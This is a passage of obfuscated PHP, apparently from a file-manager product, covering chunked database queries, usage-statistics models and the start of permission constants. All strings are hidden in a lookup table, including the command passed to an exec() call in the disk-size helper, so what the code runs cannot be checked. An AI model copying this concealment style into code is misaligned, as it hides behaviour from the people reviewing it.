$é‡Åò¾µ[$¯¾ÔÆ™•[285]][$Ÿ‰éÁÉ«][1]; $èÍËÇ¨ = is_array($èÍËÇ¨) ? $èÍËÇ¨ : array(); $Ÿ¶‘Í¢Ò = count($èÍËÇ¨); for ($ö’ÌÚí° = 0; $ö’ÌÚí° < $Ÿ¶‘Í¢Ò; $ö’ÌÚí° += $£çÒ’ãÉ) { $äùñÚÃÃ = array_slice($èÍËÇ¨, $ö’ÌÚí°, $£çÒ’ãÉ); if (!is_array($äùñÚÃÃ) || count($äùñÚÃÃ) == 0) { break; } $é‡Åò¾µ[$¯¾ÔÆ™•[285]][$Ÿ‰éÁÉ«][1] = $äùñÚÃÃ; $this->optionsValue($é‡Åò¾µ); $¯Ù¡ÂÃ’ += parent::save($Ú×Ù‡¿Õ, $•ñ¥ªÓ¢); $this->chunkEventCheck(count($äùñÚÃÃ)); } $this->chunkEventSet(); return $¯Ù¡ÂÃ’; } public function add($Ï¦àí‹œ = '', $ƒª°Ñå– = array(), $­ŸÏÍ’ = false) { if ($this->addTaskStatus && is_array($Ï¦àí‹œ)) { $this->addTaskData[] = $Ï¦àí‹œ; return; } return parent::add($Ï¦àí‹œ, $ƒª°Ñå–, $­ŸÏÍ’); } public function parseWhereLike($  ¿¯¸á, $çœúçˆÙ = '', $âŠ¢ÙÜ€ = false, &$°ö÷²ºÆ = false) { $øŸ°‡Ø =& $_SERVER[Å¶¨Şêº]; $´Î ¡Ùì = $GLOBALS[$øŸ°‡Ø[6]][$øŸ°‡Ø[390]]; if (!$´Î ¡Ùì[$øŸ°‡Ø[391]]) { return $  ¿¯¸á; } if (!is_array($  ¿¯¸á)) { return $  ¿¯¸á; } $°ãÎä Ã = array(); $İ¹ƒ×Üæ = 0; foreach ($  ¿¯¸á as $¥í„ú => $Ú¸ÖÎ£İ) { if (is_array($Ú¸ÖÎ£İ) && count($Ú¸ÖÎ£İ) == 2 && $Ú¸ÖÎ£İ[0] == $øŸ°‡Ø[392] && is_string($Ú¸ÖÎ£İ[1]) && substr($Ú¸ÖÎ£İ[1], 0, 1) == $øŸ°‡Ø[393] && substr($Ú¸ÖÎ£İ[1], strlen($Ú¸ÖÎ£İ[1]) - 1, 1) == $øŸ°‡Ø[393]) { $°ö÷²ºÆ = !0; $¡èµÙğ´ = is_string($¥í„ú) ? $¥í„ú : $çœúçˆÙ; $Ú¦ƒºÎ— = substr($Ú¸ÖÎ£İ[1], 1, strlen($Ú¸ÖÎ£İ[1]) - 2); $Ú¦ƒºÎ— = $this->db->escapeString($Ú¦ƒºÎ—); if (!strpos($¡èµÙğ´, $øŸ°‡Ø[10])) { $¡èµÙğ´ = $øŸ°‡Ø[394] . $¡èµÙğ´ . $øŸ°‡Ø[394]; } $³Èõƒ£½ = $øŸ°‡Ø[200] . $Ú¦ƒºÎ— . $øŸ°‡Ø[200]; $Ú¦ƒºÎ— = str_replace(array($øŸ°‡Ø[10], $øŸ°‡Ø[395], $øŸ°‡Ø[11]), $øŸ°‡Ø[396], $Ú¦ƒºÎ—); if ($´Î ¡Ùì[$øŸ°‡Ø[397]]) { $³Èõƒ£½ = $øŸ°‡Ø[398] . $Ú¦ƒºÎ— . $øŸ°‡Ø[399]; if ($´Î ¡Ùì[$øŸ°‡Ø[400]]) { $³Èõƒ£½ = $øŸ°‡Ø[399] . $Ú¦ƒºÎ— . $øŸ°‡Ø[398]; } } $°ãÎä Ã[$İ¹ƒ×Üæ] = $øŸ°‡Ø[401] . $¡èµÙğ´ . $øŸ°‡Ø[402] . $³Èõƒ£½ . $øŸ°‡Ø[403]; $İ¹ƒ×Üæ++; continue; } if (is_array($Ú¸ÖÎ£İ)) { $çœúçˆÙ = is_string($¥í„ú) ? $¥í„ú : $çœúçˆÙ; $Ú¸ÖÎ£İ = $this->parseWhereLike($Ú¸ÖÎ£İ, $çœúçˆÙ, !0, $°ö÷²ºÆ); } if (is_numeric($¥í„ú)) { $°ãÎä Ã[$İ¹ƒ×Üæ] = $Ú¸ÖÎ£İ; $İ¹ƒ×Üæ++; } else { $°ãÎä Ã[$¥í„ú] = $Ú¸ÖÎ£İ; } } if ($°ö÷²ºÆ && !$âŠ¢ÙÜ€) { } return $°ãÎä Ã; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($¯–•ÖŸ = array()) { $öƒ ï¼ =& $_SERVER[Å¶¨Şêº]; $ÅÔ†ÈãÔ = self::SQL_WHERE_IN_CHUNK; $Áõ†’—í = $this->optionsValue(); $ßÚ¯Ï©ı = $this->findWhereField($Áõ†’—í); if (!$ßÚ¯Ï©ı || isset($Áõ†’—í[$öƒ ï¼[302]]) || isset($Áõ†’—í[$öƒ ï¼[363]])) { return parent::select($¯–•ÖŸ); } $óãÇËÈ˜ = $Áõ†’—í[$öƒ ï¼[285]][$ßÚ¯Ï©ı][1]; $óãÇËÈ˜ = is_array($óãÇËÈ˜) ? $óãÇËÈ˜ : array(); $íàåÊòÎ = null; for ($¸æêíÓ = 0; $¸æêíÓ < count($óãÇËÈ˜); $¸æêíÓ += $ÅÔ†ÈãÔ) { $ÍŠ£ìĞÁ = array_slice($óãÇËÈ˜, $¸æêíÓ, $ÅÔ†ÈãÔ); if (!is_array($ÍŠ£ìĞÁ) || count($ÍŠ£ìĞÁ) == 0) { break; } $Áõ†’—í[$öƒ ï¼[285]][$ßÚ¯Ï©ı][1] = $ÍŠ£ìĞÁ; $this->optionsValue($Áõ†’—í); $ŠŠ†¥÷ß = parent::select($¯–•ÖŸ); if (!$ŠŠ†¥÷ß) { continue; } $íàåÊòÎ = is_array($íàåÊòÎ) ? $íàåÊòÎ : array(); $íàåÊòÎ = array_merge($íàåÊòÎ, $ŠŠ†¥÷ß); } return $íàåÊòÎ; } public function delete($¦œõ©‚• = array()) { $š¬íöÆš =& $_SERVER[Å¶¨Şêº]; $Ğâ¯ØéÆ = self::SQL_WHERE_IN_CHUNK; $çšöà‘€ = $this->optionsValue(); $á‰¢Ø˜Æ = $this->findWhereField($çšöà‘€); if (!$á‰¢Ø˜Æ) { return parent::delete($¦œõ©‚•); } $û¡¦Ú£’ = 0; $ĞŠ¢ˆë = $çšöà‘€[$š¬íöÆš[285]][$á‰¢Ø˜Æ][1]; $ĞŠ¢ˆë = is_array($ĞŠ¢ˆë) ? $ĞŠ¢ˆë : array(); for ($­Ä‚ƒÍ = 0; $­Ä‚ƒÍ < count($ĞŠ¢ˆë); $­Ä‚ƒÍ += $Ğâ¯ØéÆ) { $ì†Óú™œ = array_slice($ĞŠ¢ˆë, $­Ä‚ƒÍ, $Ğâ¯ØéÆ); if (!is_array($ì†Óú™œ) || count($ì†Óú™œ) == 0) { break; } $çšöà‘€[$š¬íöÆš[285]][$á‰¢Ø˜Æ][1] = $ì†Óú™œ; $this->optionsValue($çšöà‘€); $û¡¦Ú£’ += parent::delete($¦œõ©‚•); } return $û¡¦Ú£’; } private function findWhereField($Âõ·Óà) { $š‰Ÿü·¸ =& $_SERVER[Å¶¨Şêº]; $Ä¼¶ã·á = self::SQL_WHERE_IN_CHUNK; if (!is_array($Âõ·Óà) || !is_array($Âõ·Óà[$š‰Ÿü·¸[285]])) { return !1; } foreach ($Âõ·Óà[$š‰Ÿü·¸[285]] as $±±•†ô´ => $Ó·½ºã³) { if (is_array($Ó·½ºã³) && isset($Ó·½ºã³[0]) && is_string($Ó·½ºã³[0]) && strtolower($Ó·½ºã³[0]) == $š‰Ÿü·¸[7] && is_array($Ó·½ºã³[1]) && count($Ó·½ºã³[1]) > $Ä¼¶ã·á) { ignore_timeout(); return $±±•†ô´; } } return !1; } public function setMasterDB($‰’ãèûÊ = true) { think_config($_SERVER[Å¶¨Şêº][404], $‰’ãèûÊ); } } goto BåáªŞß’¦; BÀğ¯ôÖ´: class AnalysisModel extends ModelBaseLight { public function init($İ¢»îù¬) { $®ÃƒÍ­“ =& $_SERVER[Å¶¨Şêº]; $ìòì¦Šú = array($®ÃƒÍ­“[599] => array($®ÃƒÍ­“[43] => $®ÃƒÍ­“[1781], $®ÃƒÍ­“[283] => array($®ÃƒÍ­“[235], $®ÃƒÍ­“[763], $®ÃƒÍ­“[1782], $®ÃƒÍ­“[1783])), $®ÃƒÍ­“[1784] => array($®ÃƒÍ­“[43] => $®ÃƒÍ­“[1785], $®ÃƒÍ­“[283] => array($®ÃƒÍ­“[235], $®ÃƒÍ­“[761], $®ÃƒÍ­“[1786], $®ÃƒÍ­“[1787], $®ÃƒÍ­“[1788]))); if (!isset($ìòì¦Šú[$İ¢»îù¬])) { return !1; } $this->optionType = $ìòì¦Šú[$İ¢»îù¬][$®ÃƒÍ­“[43]]; $this->field = $ìòì¦Šú[$İ¢»îù¬][$®ÃƒÍ­“[283]]; return !0; } public function listData($´“ŒŒÙä = false, $÷«™ˆØğ = "\x6d\x6f\144\151\x66\x79\124\x69\x6d\x65", $è¹¸î¦È = false) { return parent::listData($´“ŒŒÙä, $÷«™ˆØğ, $è¹¸î¦È); } public function trendList($ÏÔôâ½î) { $¡ø³Šˆ­ =& $_SERVER[Å¶¨Şêº]; $òÂ¡–’„ = $this->listData(); if ($òÂ¡–’„) { $Î‰ê = end($òÂ¡–’„); $†íìğƒš = date($¡ø³Šˆ­[1789], strtotime($¡ø³Šˆ­[1790])); if ($Î‰ê[$¡ø³Šˆ­[235]] == $†íìğƒš) { return $òÂ¡–’„; } $ÔÅË¨„» = strtotime($Î‰ê[$¡ø³Šˆ­[235]]); } if (!isset($ÔÅË¨„»)) { $ªÃº±®Î = $ÏÔôâ½î == $¡ø³Šˆ­[599] ? $¡ø³Šˆ­[534] : $¡ø³Šˆ­[823]; $ÔÅË¨„» = Model($ªÃº±®Î)->min($¡ø³Šˆ­[212]); } $ÛÅ²ÎÑ = $¡ø³Šˆ­[1791] . ucfirst($ÏÔôâ½î); $ËØøàÙ = $this->dateList($ÔÅË¨„»); foreach ($ËØøàÙ as $†íìğƒš) { $this->{$ÛÅ²ÎÑ}($†íìğƒš); } return $this->listData(); } private function dateList($ìµ³÷Ù¢) { $íŞñ¤ÒÌ =& $_SERVER[Å¶¨Şêº]; $ì„¦‡£½ = $ìµ³÷Ù¢; $½”İÏ = strtotime($íŞñ¤ÒÌ[1790]); $’º¶Ò×¾ = array(); while ($ì„¦‡£½ <= $½”İÏ) { $’º¶Ò×¾[] = date($íŞñ¤ÒÌ[1789], $ì„¦‡£½); $ì„¦‡£½ = strtotime($íŞñ¤ÒÌ[1792], $ì„¦‡£½); } return $’º¶Ò×¾; } public function _recordUser($å­ÎÛçÁ = '') { $ÏäğòÓİ =& $_SERVER[Å¶¨Şêº]; $«½ÜÜíÁ = strtotime(date($ÏäğòÓİ[1793], strtotime($å­ÎÛçÁ))); $ÓªØš‹ğ = strtotime(date($ÏäğòÓİ[1794], strtotime($å­ÎÛçÁ))); $…´©†Ö = array($ÏäğòÓİ[212] => array($ÏäğòÓİ[1010], $ÓªØš‹ğ)); $÷Ã ª‚© = Model($ÏäğòÓİ[534])->where($…´©†Ö)->count($ÏäğòÓİ[1663]); $…´©†Ö[$ÏäğòÓİ[212]] = array($ÏäğòÓİ[343], array($«½ÜÜíÁ, $ÓªØš‹ğ)); $ÏÃ†ŠÆ = Model($ÏäğòÓİ[534])->where($…´©†Ö)->count($ÏäğòÓİ[1663]); $…´©†Ö[$ÏäğòÓİ[43]] = $ÏäğòÓİ[1795]; $Æ²îÍÔÊ = Model($ÏäğòÓİ[1796])->where($…´©†Ö)->count($ÏäğòÓİ[1797]); $öÆ¢Ûİˆ = array($ÏäğòÓİ[235] => $å­ÎÛçÁ, $ÏäğòÓİ[763] => (int) $÷Ã ª‚©, $ÏäğòÓİ[1782] => (int) $ÏÃ†ŠÆ, $ÏäğòÓİ[1783] => (int) $Æ²îÍÔÊ); return $this->insert($öÆ¢Ûİˆ); } public function _recordStore($…ê¥¿İ = '') { $æ¦¥Òğ† =& $_SERVER[Å¶¨Şêº]; $‹°¢ûçÂ = strtotime(date($æ¦¥Òğ†[1794], strtotime($…ê¥¿İ))); $ëÍº¥Ñé = array($æ¦¥Òğ†[212] => array($æ¦¥Òğ†[1010], $‹°¢ûçÂ)); $ĞŒ•ÚÂ± = Model($æ¦¥Òğ†[480])->where($ëÍº¥Ñé)->sum($æ¦¥Òğ†[87]); $ëÍº¥Ñé[$æ¦¥Òğ†[419]] = 0; $»›°Œ’è = Model($æ¦¥Òğ†[823])->where($ëÍº¥Ñé)->sum($æ¦¥Òğ†[87]); $ëÍº¥Ñé[$æ¦¥Òğ†[420]] = 1; $´ŸÚ‡  = Model($æ¦¥Òğ†[823])->where($ëÍº¥Ñé)->sum($æ¦¥Òğ†[87]); $ëÍº¥Ñé[$æ¦¥Òğ†[420]] = 2; $èÏçŒİœ = Model($æ¦¥Òğ†[823])->where($ëÍº¥Ñé)->sum($æ¦¥Òğ†[87]); $ÚªğäÓ´ = array($æ¦¥Òğ†[235] => $…ê¥¿İ, $æ¦¥Òğ†[761] => (int) $»›°Œ’è, $æ¦¥Òğ†[1786] => (int) $ĞŒ•ÚÂ±, $æ¦¥Òğ†[1787] => (int) $´ŸÚ‡ , $æ¦¥Òğ†[1788] => (int) $èÏçŒİœ); return $this->insert($ÚªğäÓ´); } public function trend($¬”İ“Š, $”ó“É«‹) { $íÁå°å€ =& $_SERVER[Å¶¨Şêº]; if (!$this->init($¬”İ“Š)) { return !1; } $È—ï“‚ë = $this->trendList($¬”İ“Š); if ($È—ï“‚ë && $”ó“É«‹ != $íÁå°å€[1636]) { $ÚŞìƒ’™ = $È—ï“‚ë[0][$íÁå°å€[235]]; $¶Èæ† = $this->validDate($”ó“É«‹, $ÚŞìƒ’™); $üÕ„àØü = array(); $ŠÏµô•« = array_to_keyvalue($È—ï“‚ë, $íÁå°å€[235]); foreach ($¶Èæ† as $õÖÂ²øá) { if (isset($ŠÏµô•«[$õÖÂ²øá])) { $íõŒ—‡ª = $ŠÏµô•«[$õÖÂ²øá]; } else { $íõŒ—‡ª = end($È—ï“‚ë); $íõŒ—‡ª[$íÁå°å€[235]] = $õÖÂ²øá; if ($¬”İ“Š == $íÁå°å€[599]) { $íõŒ—‡ª[$íÁå°å€[1782]] = $íõŒ—‡ª[$íÁå°å€[1783]] = 0; } } $üÕ„àØü[] = $íõŒ—‡ª; } $È—ï“‚ë = $üÕ„àØü; } $Ñóƒ—˜ = array($íÁå°å€[599] => array($íÁå°å€[763] => LNG($íÁå°å€[1798]), $íÁå°å€[1782] => LNG($íÁå°å€[1799]), $íÁå°å€[1783] => LNG($íÁå°å€[1800])), $íÁå°å€[1784] => array($íÁå°å€[761] => LNG($íÁå°å€[1801]), $íÁå°å€[1786] => LNG($íÁå°å€[1802]), $íÁå°å€[1787] => LNG($íÁå°å€[1803]), $íÁå°å€[1788] => LNG($íÁå°å€[1804]))); $±Æâë¬ = array($íÁå°å€[599] => $íÁå°å€[1805], $íÁå°å€[1784] => $íÁå°å€[87]); if (empty($È—ï“‚ë)) { $õÖÂ²øá = date($íÁå°å€[1789], strtotime($íÁå°å€[1790])); $«§µ¹ôğ = array($íÁå°å€[235] => $õÖÂ²øá); foreach ($Ñóƒ—˜[$¬”İ“Š] as $‘Â£„ú => $á§¬™ÆÇ) { $«§µ¹ôğ[$‘Â£„ú] = 0; } $È—ï“‚ë[] = $«§µ¹ôğ; } $¤™úªùá = array(); foreach ($È—ï“‚ë as $á§¬™ÆÇ) { if ($¬”İ“Š == $íÁå°å€[1784] && $á§¬™ÆÇ[$íÁå°å€[1786]] > $á§¬™ÆÇ[$íÁå°å€[761]]) { $á§¬™ÆÇ[$íÁå°å€[1786]] = $á§¬™ÆÇ[$íÁå°å€[761]]; } foreach ($Ñóƒ—˜[$¬”İ“Š] as $‘Â£„ú => $ÂŠ™…˜Å) { $íõŒ—‡ª = array($íÁå°å€[235] => $á§¬™ÆÇ[$íÁå°å€[235]], $íÁå°å€[1563] => $ÂŠ™…˜Å); $íõŒ—‡ª[$±Æâë¬[$¬”İ“Š]] = isset($á§¬™ÆÇ[$‘Â£„ú]) ? $á§¬™ÆÇ[$‘Â£„ú] : 0; $¤™úªùá[] = $íõŒ—‡ª; } } return $¤™úªùá; } public function validDate($Ì‹²•…î, $¬Ñğ«×) { $ÇÑ²òÊŠ =& $_SERVER[Å¶¨Şêº]; $íŒ»…¢Ş = date($ÇÑ²òÊŠ[1789], strtotime($ÇÑ²òÊŠ[1790])); $•äó÷ÀØ = array($íŒ»…¢Ş); switch ($Ì‹²•…î) { case $ÇÑ²òÊŠ[1643]: $˜˜Ä×¶Š = mktime(0, 0, 0, date($ÇÑ²òÊŠ[1806]), date($ÇÑ²òÊŠ[1385]) - date($ÇÑ²òÊŠ[1448]) + 7 - 7, date($ÇÑ²òÊŠ[1807])); $´í‚½„â = 0; do { $¹…çëˆÑ = date($ÇÑ²òÊŠ[1789], $˜˜Ä×¶Š - 3600 * 24 * 7 * $´í‚½„â); $•äó÷ÀØ[] = $¹…çëˆÑ; $´í‚½„â++; } while ($¬Ñğ«× < $¹…çëˆÑ); break; case $ÇÑ²òÊŠ[1641]: $´í‚½„â = 1; do { $Ã À¬½ş = date($ÇÑ²òÊŠ[1808], strtotime("\x2d\40{$´í‚½„â}\40\x6d\157\x6e\x74\x68\x73")); $•äó÷ÀØ[] = $Ã À¬½ş; $´í‚½„â++; } while ($¬Ñğ«× < $Ã À¬½ş); break; case $ÇÑ²òÊŠ[1809]: $Ö¶áÕÉ¯ = (int) date($ÇÑ²òÊŠ[1807], strtotime($¬Ñğ«×)); $‡¦²¬ë = (int) date($ÇÑ²òÊŠ[1807]); if ($Ö¶áÕÉ¯ >= $‡¦²¬ë) { break; } for ($Ö¶áÕÉ¯; $Ö¶áÕÉ¯ < $‡¦²¬ë; $Ö¶áÕÉ¯++) { $•äó÷ÀØ[] = $Ö¶áÕÉ¯ . $ÇÑ²òÊŠ[1810]; } break; default: break; } if ($¬Ñğ«× > end($•äó÷ÀØ)) { array_pop($•äó÷ÀØ); } sort($•äó÷ÀØ); return $•äó÷ÀØ; } public function listTable($Õ‰‘í) { $ıí™ÈëĞ = ucfirst($Õ‰‘í); return Model($ıí™ÈëĞ)->listData(); } public function option($Øµ¯ÁÂ) { $û‚…¬…ç = $_SERVER[Å¶¨Şêº][1811] . ucfirst($Øµ¯ÁÂ); return $this->{$û‚…¬…ç}(); } private function optionUser() { $¯·Ñı×• =& $_SERVER[Å¶¨Şêº]; $øùşÛñ = Model($¯·Ñı×•[534])->count($¯·Ñı×•[1663]); $Ä‹Åõ¤ã = Model($¯·Ñı×•[534])->where($¯·Ñı×•[1812])->count($¯·Ñı×•[1663]); $–ââ¢Äù = intval($GLOBALS[$¯·Ñı×•[6]][$¯·Ñı×•[359]][$¯·Ñı×•[1618]]) / 3600; $¡‹¢úàŞ = strtotime("\x2d{$–ââ¢Äù}\x20\150\x6f\x75\x72\163"); $”…ü×µÃ = strtotime(date($¯·Ñı×•[1793])); if ($¡‹¢úàŞ < $”…ü×µÃ) { $¡‹¢úàŞ = $”…ü×µÃ; } $í–«—´ı = array($¯·Ñı×•[1813] => array($¯·Ñı×•[1011], $¡‹¢úàŞ)); $´ığèÖÈ = (int) Model($¯·Ñı×•[534])->where($í–«—´ı)->count($¯·Ñı×•[1663]); if (!$´ığèÖÈ) { $´ığèÖÈ = 1; } $í–«—´ı = array($¯·Ñı×•[1813] => array($¯·Ñı×•[1011], $”…ü×µÃ)); $ø¡û€§› = Model($¯·Ñı×•[534])->where($í–«—´ı)->count($¯·Ñı×•[1663]); return array($¯·Ñı×•[756] => (int) $øùşÛñ, $¯·Ñı×•[1814] => (int) ($øùşÛñ - $Ä‹Åõ¤ã), $¯·Ñı×•[1815] => (int) $Ä‹Åõ¤ã, $¯·Ñı×•[1816] => (int) $ø¡û€§›, $¯·Ñı×•[1817] => $´ığèÖÈ); } private function optionFile() { $¾»ƒ·Í‰ =& $_SERVER[Å¶¨Şêº]; $”¦‡ÇñÂ = $this->sourceSize(); $ÁöÅ‘É = $”¦‡ÇñÂ[$¾»ƒ·Í‰[87]]; $Ø¡Ñó´Î = $”¦‡ÇñÂ[$¾»ƒ·Í‰[1786]]; $çµû˜ğ¦ = Model($¾»ƒ·Í‰[823])->where(array($¾»ƒ·Í‰[419] => 0))->count($¾»ƒ·Í‰[411]); $µÙ¥áõ = array($¾»ƒ·Í‰[419] => 0, $¾»ƒ·Í‰[212] => array($¾»ƒ·Í‰[1011], strtotime(date($¾»ƒ·Í‰[1793])))); $“Ûè¼îä = Model($¾»ƒ·Í‰[823])->where($µÙ¥áõ)->sum($¾»ƒ·Í‰[87]); $õÍ‹Æº = Model($¾»ƒ·Í‰[823])->where($µÙ¥áõ)->count($¾»ƒ·Í‰[411]); return array($¾»ƒ·Í‰[761] => $ÁöÅ‘É, $¾»ƒ·Í‰[1786] => $Ø¡Ñó´Î, $¾»ƒ·Í‰[1818] => $ÁöÅ‘É - $Ø¡Ñó´Î, $¾»ƒ·Í‰[1819] => (int) $“Ûè¼îä, $¾»ƒ·Í‰[763] => (int) $çµû˜ğ¦, $¾»ƒ·Í‰[1820] => (int) $õÍ‹Æº); } private function optionAccess() { $Úó†ò¿ =& $_SERVER[Å¶¨Şêº]; return array($Úó†ò¿[756] => $this->typeLogCnt(), $Úó†ò¿[118] => $this->typeLogCnt($Úó†ò¿[118]), $Úó†ò¿[461] => $this->typeLogCnt($Úó†ò¿[461]), $Úó†ò¿[1821] => $this->typeLogCnt($Úó†ò¿[1821]), $Úó†ò¿[1822] => $this->typeLogCnt($Úó†ò¿[1822]), $Úó†ò¿[599] => $this->typeLogCnt($Úó†ò¿[12], $Úó†ò¿[1797])); } private function typeLogCnt($¾Š‘ùû = '', $Êõ±êèŠ = "\x69\x64") { $¶—€»¾à =& $_SERVER[Å¶¨Şêº]; $ƒ½Ğßšû = array($¶—€»¾à[118] => array($¶—€»¾à[1823], $¶—€»¾à[1824]), $¶—€»¾à[461] => array($¶—€»¾à[1825], $¶—€»¾à[1826]), $¶—€»¾à[1821] => array($¶—€»¾à[1827], $¶—€»¾à[1828], $¶—€»¾à[1829]), $¶—€»¾à[1822] => array($¶—€»¾à[1830], $¶—€»¾à[1831]), $¶—€»¾à[1832] => array($¶—€»¾à[1833], $¶—€»¾à[1834], $¶—€»¾à[1835])); $¥Ê¨»œ = strtotime(date($¶—€»¾à[1793])); $Ù»©©ÁĞ = array($¶—€»¾à[212] => array($¶—€»¾à[1011], $¥Ê¨»œ)); if ($¾Š‘ùû) { $Ù»©©ÁĞ[$¶—€»¾à[43]] = array($¶—€»¾à[7], $ƒ½Ğßšû[$¾Š‘ùû]); } $ÇËø¬š = Model($¶—€»¾à[1796])->where($Ù»©©ÁĞ)->count($Êõ±êèŠ); return (int) $ÇËø¬š; } private function optionServer() { $ô¥ ¤ö =& $_SERVER[Å¶¨Şêº]; $‰Ê ·ë = $this->diskDriver(); $Ş–É“î = KodIO::defaultDriver(); $Æğşü‘ = array($ô¥ ¤ö[815] => $Ş–É“î[$ô¥ ¤ö[408]]); $‚·¤ÎğÅ = Model($ô¥ ¤ö[480])->where($Æğşü‘)->sum($ô¥ ¤ö[87]); $¥ÑÈÆ·û = explode($ô¥ ¤ö[63], $_SERVER[$ô¥ ¤ö[154]]); $÷…Â‰çÇ = $¥ÑÈÆ·û[0]; $»–ü¶¼ = $GLOBALS[$ô¥ ¤ö[6]][$ô¥ ¤ö[31]]; $áåÆ¬Óˆ = $»–ü¶¼[$ô¥ ¤ö[973]]; if ($áåÆ¬Óˆ == $ô¥ ¤ö[961]) { $´Õ¦úàü = explode($ô¥ ¤ö[1277], $»–ü¶¼[$ô¥ ¤ö[972]]); $áåÆ¬Óˆ = $´Õ¦úàü[0]; } if ($áåÆ¬Óˆ == $ô¥ ¤ö[909] || $áåÆ¬Óˆ == $ô¥ ¤ö[802]) { $’ô¢ºÀ = Model()->db()->query($ô¥ ¤ö[1836]); $›‘‚Œú = $’ô¢ºÀ[0] && isset($’ô¢ºÀ[0][$ô¥ ¤ö[1562]]) ? $’ô¢ºÀ[0][$ô¥ ¤ö[1562]] : 0; $áåÆ¬Óˆ = $ô¥ ¤ö[1837] . ($›‘‚Œú ? $ô¥ ¤ö[8] . $›‘‚Œú : $ô¥ ¤ö[12]); } $õ£×³õ = $GLOBALS[$ô¥ ¤ö[6]][$ô¥ ¤ö[359]][$ô¥ ¤ö[825]]; return array($ô¥ ¤ö[1838] => $‰Ê ·ë ? $‰Ê ·ë[$ô¥ ¤ö[1839]] : 0, $ô¥ ¤ö[1840] => $‰Ê ·ë ? $‰Ê ·ë[$ô¥ ¤ö[1841]] : 0, $ô¥ ¤ö[1842] => (int) $Ş–É“î[$ô¥ ¤ö[1839]] * 1024 * 1024 * 1024, $ô¥ ¤ö[1843] => (int) $‚·¤ÎğÅ, $ô¥ ¤ö[1844] => ucfirst($÷…Â‰çÇ), $ô¥ ¤ö[1845] => $ô¥ ¤ö[1846] . PHP_VERSION, $ô¥ ¤ö[1847] => phpBuild64() ? 64 : 32, $ô¥ ¤ö[755] => str_replace($ô¥ ¤ö[1127], $ô¥ ¤ö[989], $áåÆ¬Óˆ), $ô¥ ¤ö[359] => ucfirst($õ£×³õ), $ô¥ ¤ö[42] => $_SERVER[$ô¥ ¤ö[1848]]); } private function diskDriver() { $Â¶Ù“â =& $_SERVER[Å¶¨Şêº]; $Ùìƒş—À = $Â¶Ù“â[8]; $×Ê¥ç´’ = $GLOBALS[$Â¶Ù“â[6]][$Â¶Ù“â[1294]] == $Â¶Ù“â[1295]; if ($×Ê¥ç´’) { $Ùìƒş—À = $Â¶Ù“â[1849]; if (function_exists($Â¶Ù“â[1850])) { exec($Â¶Ù“â[1851], $÷Ë’ÉŸ); $Ùìƒş—À = $÷Ë’ÉŸ[1] . $Â¶Ù“â[8]; } } if (!file_exists($Ùìƒş—À)) { return; } $˜í™’×ó = @disk_total_space($Ùìƒş—À); $Ä±åÊÛœ = $˜í™’×ó - @disk_free_space($Ùìƒş—À); return array($Â¶Ù“â[1839] => $˜í™’×ó, $Â¶Ù“â[1841] => $Ä±åÊÛœ); } public function fileChart($·­À®ğ¢) { $¬í¤Îğ± =& $_SERVER[Å¶¨Şêº]; if (isset($·­À®ğ¢[$¬í¤Îğ±[1663]])) { return Model($¬í¤Îğ±[823])->userFileTypeProfile($·­À®ğ¢[$¬í¤Îğ±[1663]]); } if (isset($·­À®ğ¢[$¬í¤Îğ±[1852]])) { return Model($¬í¤Îğ±[823])->groupFileTypeProfile($·­À®ğ¢[$¬í¤Îğ±[1852]]); } $ÛÀò­ı¼ = $this->sourceSize(); $ÉêÉí» = array($¬í¤Îğ±[441] => 0, $¬í¤Îğ±[420] => 1); $õ¾‰·ãû = Model($¬í¤Îğ±[823])->where($ÉêÉí»)->sum($¬í¤Îğ±[87]); $ÉêÉí»[$¬í¤Îğ±[420]] = 2; $´² ‘ì® = Model($¬í¤Îğ±[823])->where($ÉêÉí»)->sum($¬í¤Îğ±[87]); return array($¬í¤Îğ±[761] => $ÛÀò­ı¼[$¬í¤Îğ±[87]], $¬í¤Îğ±[1786] => $ÛÀò­ı¼[$¬í¤Îğ±[1786]], $¬í¤Îğ±[1787] => (int) $õ¾‰·ãû, $¬í¤Îğ±[1788] => (int) $´² ‘ì®); } private function sourceSize() { $ŞÈºÆğÌ =& $_SERVER[Å¶¨Şêº]; $ô•á‹‚ = Model($ŞÈºÆğÌ[823])->where(array($ŞÈºÆğÌ[419] => 0))->sum($ŞÈºÆğÌ[87]); $ŸÙ‘’´Å = Model($ŞÈºÆğÌ[480])->sum($ŞÈºÆğÌ[87]); if ($ŸÙ‘’´Å > $ô•á‹‚) { $ŸÙ‘’´Å = $ô•á‹‚; } return array($ŞÈºÆğÌ[87] => (int) $ô•á‹‚, $ŞÈºÆğÌ[1786] => (int) $ŸÙ‘’´Å); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $œ×‰”õ¦ =& $_SERVER[Å¶¨Şêº]; $¢Õ¾ş = array(array($œ×‰”õ¦[429] => LNG($œ×‰”õ¦[1853]), $œ×‰”õ¦[1854] => $œ×‰”õ¦[1855], $œ×‰”õ¦[1856] => 1, $œ×‰”õ¦[1857] => 1, $œ×‰”õ¦[1858] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($œ×‰”õ¦[429] => LNG($œ×‰”õ¦[1859]), $œ×‰”õ¦[1854] => $œ×‰”õ¦[1860], $œ×‰”õ¦[1856] => 2, $œ×‰”õ¦[1857] => 1, $œ×‰”õ¦[1858] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($œ×‰”õ¦[429] => LNG($œ×‰”õ¦[1861]), $œ×‰”õ¦[1854] 